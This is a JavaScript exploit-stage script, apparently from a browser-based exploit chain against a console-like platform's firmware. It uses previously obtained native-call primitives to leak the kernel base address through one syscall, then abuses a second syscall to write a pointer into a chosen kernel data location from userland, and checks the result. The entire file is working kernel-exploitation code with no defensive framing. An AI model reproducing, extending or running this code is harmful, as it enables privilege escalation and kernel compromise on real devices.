// KERNEL WRITE TEST v2: pass kbase+0x3AC30DF0 (a known-mapped kernel
// data location containing a pointer that 638 reads) as 598's output
// buffer. 598 writes 4 bytes there. Then 638 re-reads and returns the
// modified value. If arg3 changed → KERNEL WRITE FROM USERLAND.
// Baseline arg3 recorded before the write. call64 for the 64-bit
// kernel address. The write value is whatever 598 normally writes
// (the ProcParam pointer for our process) — overwriting a kernel
// pointer with a different kernel pointer.
// Markers: kwt2_preflight, kwt2_kbase, kwt2_baseline, kwt2_write,
// kwt2_post, kwt2_done = 6 of 8.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      typeof native.call64 !== "function" ||
      !native.frame || !Number.isSafeInteger(native.frameAddress) ||
      typeof native.wrappers.sys638 !== "number" ||
      typeof native.wrappers.sys598 !== "number")
    throw new Error("chain_or_call64_missing");
  var frame = native.frame;
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("kwt2_preflight");

  // Step 1: derive kbase via 638 sel=0
  phase = "derive_kbase";
  var out2Off = 0x1e00, out3Off = 0x1e10;
  var out2Addr = native.frameAddress + out2Off;
  var out3Addr = native.frameAddress + out3Off;
  var fv = new DataView(frame.buffer);
  var o2orig = Array.from(frame.subarray(out2Off, out2Off + 32));
  var o3orig = Array.from(frame.subarray(out3Off, out3Off + 16));
  native.call("sys638", [0, out2Addr, out3Addr]);
  var klo = fv.getUint32(out2Off, true);
  var khi = fv.getUint32(out2Off + 4, true);
  var blo = (klo - 0x3B1AABA0) >>> 0;
  var bhi = khi;
  if (klo < 0x3B1AABA0) { blo = (klo - 0x3B1AABA0) >>> 0;
    bhi = (khi - 1) >>> 0; }
  mark("kwt2_kbase");

  // Step 2: read baseline pointer from 638 arg3
  phase = "baseline";
  native.call("sys638", [0, out2Addr, out3Addr]);
  var base_lo = fv.getUint32(out3Off, true);
  var base_hi = fv.getUint32(out3Off + 4, true);
  var base_ptr = "lo:" + base_lo.toString(16) + " hi:" + base_hi.toString(16);
  mark("kwt2_baseline:" + base_ptr);

  // Step 3: compute kbase + 0x3AC30DF0 as the write target
  var DOFF = 0x3AC30DF0;
  var tlo = (blo + DOFF) >>> 0;
  var thi = (bhi + ((blo + DOFF) > 0xffffffff ? 1 : 0)) >>> 0;
  var targetHex = thi.toString(16) + (function (lo) {
    var h = lo.toString(16);
    while (h.length < 8) h = "0" + h;
    return h;
  })(tlo);
  mark("kwt2_target:" + targetHex);

  // Step 4: THE KERNEL WRITE — 598 with kernel address as arg1
  // 598 writes 4 bytes (the ProcParam pointer) to arg1
  phase = "kernel_write";
  var kresult = native.call64("sys598",
    [[tlo, thi], [out3Addr % 0x100000000,
      Math.floor(out3Addr / 0x100000000)]]);
  var kerrno = (kresult.value === -1) ? native.readErrno() : null;
  mark("kwt2_write_done:" + kresult.value + "/" +
    (kerrno === null ? "ok" : kerrno));

  // Step 5: read 638 arg3 again
  phase = "post_read";
  var post_lo = 0, post_hi = 0;
  var r2off = 0x1dc0;
  var r2addr = native.frameAddress + r2off;
  var sv = fv.getUint32(r2off, true);
  fv.setUint32(r2off, 0, true);
  fv.setUint32(r2off + 4, 0, true);
  native.call("sys638", [0, r2addr, out3Addr]);
  fv.setUint32(r2off, sv, true);
  post_lo = fv.getUint32(out3Off, true);
  post_hi = fv.getUint32(out3Off + 4, true);
  var post_ptr = "lo:" + post_lo.toString(16) + " hi:" + post_hi.toString(16);
  var changed = (post_lo !== base_lo) || (post_hi !== base_hi);
  mark("kwt2_post:" + post_ptr + (changed ? " CHANGED" : " same"));

  // Restore the 638 out3 area
  for (var r = 0; r < 16; r++) frame[out3Off + r] = o3orig[r];
  for (var r2 = 0; r2 < 32; r2++) frame[out2Off + r2] = o2orig[r2];
  var after = native.call("getpid", []);
  mark("kwt2_done");

  result = { id: "kernel_write_v2",
    status: (after.value === before.value && after.high === 0) ?
      "pass" : "fail",
    details: { target: targetHex,
      baseline_ptr: base_ptr,
      post_write_ptr: post_ptr,
      changed: changed ? 1 : 0,
      k598_ret: kresult.value,
      k598_errno: kerrno === null ? "ok" : kerrno,
      pid_ok: after.value === before.value && after.high === 0 } };
} catch (error) {
  result = { id: "kernel_write_v2", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
